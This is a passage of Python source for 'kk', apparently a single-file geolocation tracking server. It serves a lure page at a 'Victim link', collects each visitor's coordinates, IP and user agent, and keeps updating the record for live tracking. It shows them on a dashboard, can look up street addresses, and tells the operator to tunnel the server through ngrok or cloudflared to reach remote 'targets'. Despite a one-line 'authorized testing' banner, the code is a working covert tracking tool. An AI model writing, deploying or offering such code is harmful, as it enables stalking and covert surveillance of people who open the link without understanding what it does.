        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        if body:
            self.wfile.write(body)

    def _send_json(self, obj):
        body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self._send(200, body, "application/json; charset=utf-8")

    # ---- GET ----
    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path in ("/", "/index.html", "/index.htm"):
            self._send(200, PAGE_VICTIM)
        elif path == "/logs":
            self._send(200, PAGE_DASH)
        elif path == "/api/locations":
            with DATA_LOCK:
                snap = list(reversed(DATA))
            self._send_json(snap)
        elif path == "/favicon.ico":
            self._send(204, b"")
        else:
            sys.stderr.write("[!] 404 %s from %s\n" % (self.path, self.client_address[0]))
            self._send(404, "<h1>404 Not Found</h1>")

    # ---- POST ----
    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        if path == "/location":
            self._handle_location()
        elif path == "/api/clear":
            with DATA_LOCK:
                DATA.clear()
            print(Y + "[i] Location log cleared" + R)
            self._send_json({"status": "cleared"})
        else:
            self._send(404, "<h1>404 Not Found</h1>")

    def _handle_location(self):
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length) if length else b""
        try:
            rec = json.loads(raw.decode("utf-8", "replace"))
            if not isinstance(rec, dict):
                rec = {"bad_payload": True}
        except Exception:
            rec = {"bad_payload": True, "raw": raw[:200].decode("utf-8", "replace")}

        rec["ua"] = self.headers.get("User-Agent", "")
        xff = self.headers.get("X-Forwarded-For", "")
        # trust X-Forwarded-For when behind ngrok / cloudflared
        rec["ip"] = (xff.split(",")[0].strip() if xff else self.client_address[0])
        rec["recv_time"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S") + " UTC"

        # same victim IP keeps streaming updates -> replace last record (live tracking)
        updating = False
        with DATA_LOCK:
            if DATA and DATA[-1].get("ip") == rec.get("ip"):
                DATA[-1] = rec
                updating = True
            else:
                DATA.append(rec)
        _print_hit(rec, updating)

        if GOOGLE_KEY and rec.get("lat") is not None and rec.get("lon") is not None:
            threading.Thread(target=_reverse_geocode, args=(rec,), daemon=True).start()

        self._send_json({"status": "ok", "count": len(DATA)})


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def main():
    global GOOGLE_KEY

    parser = argparse.ArgumentParser(
        description="kk - single-file HTML5 geolocation tracking server (kk-style)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  python3 kk.py -p 8080
  GOOGLE_MAPS_API_KEY=xxxx python3 kk.py -p 8443
""",
    )
    parser.add_argument("-p", "--port", type=int, default=8080, help="listen port (default: 8080)")
    parser.add_argument("--host", default="0.0.0.0", help="bind address (default: 0.0.0.0)")
    parser.add_argument("--key", default="", help="Google Maps Geocoding API key (optional, for street addresses)")
    args = parser.parse_args()
    GOOGLE_KEY = args.key

    print(G + "=" * 64 + R)
    print(G + B + "  kk v%s - HTML5 Geolocation Tracking Server" % VERSION + R)
    print(G + "  Single file, standard library only. For authorized testing." + R)
    print(G + "=" * 64 + R)

    server = ThreadingHTTPServer((args.host, args.port), Handler)
    host_ip = "127.0.0.1" if args.host == "0.0.0.0" else args.host

    print(C + "[*] Victim link : " + R + "http://%s:%d/" % (host_ip, args.port))
    print(C + "[*] Dashboard   : " + R + "http://%s:%d/logs" % (host_ip, args.port))
    print(Y + "[i] The Geolocation API requires HTTPS (or localhost)." + R)
    print(Y + "    Expose this server for remote targets with:" + R)
    print(Y + "        ngrok http %d" % args.port + R)
    print(Y + "        cloudflared tunnel --url http://localhost:%d" % args.port + R)
    if GOOGLE_KEY:
        print(G + "[+] Reverse geocoding ENABLED (Google Geocoding API)" + R)
    else:
        print(Y + "[i] No Google API key - street addresses disabled (coordinates still captured)." + R)
    print(Y + "[*] Waiting for targets... (Ctrl+C to stop)" + R)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n" + Y + "[i] Shutting down." + R)
        server.shutdown()


if __name__ == "__main__":
    main()
